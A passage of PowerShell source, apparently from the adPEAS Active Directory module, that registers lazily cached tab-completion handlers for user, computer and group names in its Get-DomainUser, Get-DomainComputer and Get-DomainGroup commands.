                          $Script:CompletionCache.Groups.Count -gt 0 -or
                          $Script:CompletionCache.GPOs.Count -gt 0 -or
                          $Script:CompletionCache.Templates.Count -gt 0)
        }
    }
}

# =====================================================================
# IMPORTANT: ArgumentCompleter ScriptBlocks run in a DIFFERENT scope
# than the adPEAS module. We need to access the module's script variables
# via Get-Variable -Scope Script, but since the scriptblock executes in
# the caller's scope, we use a closure to capture the current module scope.
# =====================================================================

# Helper function to get adPEAS module variables (called from within the module scope)
function Get-adPEASCompletionState {
    [CmdletBinding()]
    param([string]$ObjectType)

    return @{
        HasConnection = ($null -ne $Script:LdapConnection)
        Cache = $Script:CompletionCache
        CacheAttempted = $Script:CompletionCacheAttempted
    }
}

# Get-DomainUser -Identity completer
Register-ArgumentCompleter -CommandName Get-DomainUser -ParameterName Identity -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters)

    # Get state from the adPEAS module scope
    $state = Get-adPEASCompletionState -ObjectType 'Users'

    # Lazy loading: Build cache on first TAB press if connection exists and not yet attempted
    if ($state.HasConnection -and
        (-not $state.Cache -or $state.Cache.Users.Count -eq 0) -and
        (-not $state.CacheAttempted -or -not $state.CacheAttempted.Users)) {
        # Build cache for Users only (lazy, on-demand)
        Build-CompletionCache -ObjectTypes @('Users')
        # Refresh state after building
        $state = Get-adPEASCompletionState -ObjectType 'Users'
    }

    if ($state.Cache -and $state.Cache.Users -and $state.Cache.Users.Count -gt 0) {
        $state.Cache.Users | Where-Object {
            $_ -like "$wordToComplete*"
        } | Select-Object -First 50 | ForEach-Object {
            # Quote with double quotes and escape special characters (handles O'Brien, $vars, etc.)
            $completionText = if ($_ -match "[\s'`"`$``]") {
                '"' + ($_ -replace '"', '""') + '"'
            } else { $_ }
            [System.Management.Automation.CompletionResult]::new(
                $completionText,
                $_,
                'ParameterValue',
                "User: $_"
            )
        }
    }
}

# Get-DomainComputer -Identity completer
Register-ArgumentCompleter -CommandName Get-DomainComputer -ParameterName Identity -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters)

    # Get state from the adPEAS module scope
    $state = Get-adPEASCompletionState -ObjectType 'Computers'

    # Lazy loading: Build cache on first TAB press if connection exists and not yet attempted
    if ($state.HasConnection -and
        (-not $state.Cache -or $state.Cache.Computers.Count -eq 0) -and
        (-not $state.CacheAttempted -or -not $state.CacheAttempted.Computers)) {
        # Build cache for Computers only (lazy, on-demand)
        Build-CompletionCache -ObjectTypes @('Computers')
        # Refresh state after building
        $state = Get-adPEASCompletionState -ObjectType 'Computers'
    }

    if ($state.Cache -and $state.Cache.Computers -and $state.Cache.Computers.Count -gt 0) {
        $state.Cache.Computers | Where-Object {
            $_ -like "$wordToComplete*"
        } | Select-Object -First 50 | ForEach-Object {
            # Quote with double quotes and escape special characters
            $completionText = if ($_ -match "[\s'`"`$``]") {
                '"' + ($_ -replace '"', '""') + '"'
            } else { $_ }
            [System.Management.Automation.CompletionResult]::new(
                $completionText,
                $_,
                'ParameterValue',
                "Computer: $_"
            )
        }
    }
}

# Get-DomainGroup -Identity completer
Register-ArgumentCompleter -CommandName Get-DomainGroup -ParameterName Identity -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters)

    # Get state from the adPEAS module scope
    $state = Get-adPEASCompletionState -ObjectType 'Groups'

    # Lazy loading: Build cache on first TAB press if connection exists and not yet attempted
    if ($state.HasConnection -and
        (-not $state.Cache -or $state.Cache.Groups.Count -eq 0) -and
        (-not $state.CacheAttempted -or -not $state.CacheAttempted.Groups)) {
        # Build cache for Groups only (lazy, on-demand)
        Build-CompletionCache -ObjectTypes @('Groups')
        # Refresh state after building
        $state = Get-adPEASCompletionState -ObjectType 'Groups'
    }

    if ($state.Cache -and $state.Cache.Groups -and $state.Cache.Groups.Count -gt 0) {
        $state.Cache.Groups | Where-Object {
            $_ -like "$wordToComplete*"
        } | Select-Object -First 50 | ForEach-Object {
            # Quote with double quotes and escape special characters
            $completionText = if ($_ -match "[\s'`"`$``]") {
                '"' + ($_ -replace '"', '""') + '"'
            } else { $_ }
            [System.Management.Automation.CompletionResult]::new(
                $completionText,
                $_,
                'ParameterValue',
                "Group: $_"
            )
        }
    }
}

